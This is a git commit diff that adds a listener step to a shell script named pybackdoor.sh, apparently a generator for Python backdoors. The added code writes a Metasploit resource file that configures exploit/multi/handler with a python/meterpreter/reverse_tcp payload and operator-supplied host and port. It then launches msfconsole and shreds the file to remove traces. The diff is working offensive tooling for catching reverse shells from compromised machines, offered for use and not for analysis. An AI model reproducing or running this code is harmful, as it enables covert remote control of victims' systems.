f9edbe6ea77cae9927a89a17e81d863bfc074a0e
rek292 <83674893+rek292@users.noreply.github.com>
2021-05-05 19:55:59 +0000

    Update pybackdoor.sh

--- pybackdoor.sh
+++ pybackdoor.sh
@@ -34,6 +34,44 @@ echo ""
 shred -n 5 temp.txt -u
 echo "[ + ] OK ... " | pv -qL 10
 echo ""
+echo ""
+sleep 1.1
+x=0
+while [ $x = 0 ]
+do
+read -p "[ ? ] Do you want to start Listener? [ Y/n ] " listener1
+	case "$listener1" in
+n)
+echo '' && exit
+;;
+Y)
+echo ""
+sleep 0.7
+echo "[ + ] Creating handler.rc file ..." | pv -qL 10
+echo ""
+sleep 0.5
+touch handler.rc && chmod 777 handler.rc
+echo use exploit/multi/handler >> handler.rc
+echo set payload python/meterpreter/reverse_tcp >> handler.rc
+echo set LHOST $lh >> handler.rc
+echo set LPORT $lp >> handler.rc
+echo exploit >> handler.rc
+echo "[ + ] handler.rc created successfully ..." | pv -qL 10
+echo ""
+sleep 1
+echo "[ + ] Starting Metasploit ... " | pv -qL 10
+echo ""
+sleep 0.8
+msfconsole -r handler.rc
+echo ""
+echo ""
+echo "[ + ] Cleaning handler.rc ... " | pv -qL 10
+echo ""
+shred -n 5 handler.rc -u
+echo "[ + ] OK ..." | pv -qL 10
+echo ""
 sleep 1.1
 exit
+esac
+done
 
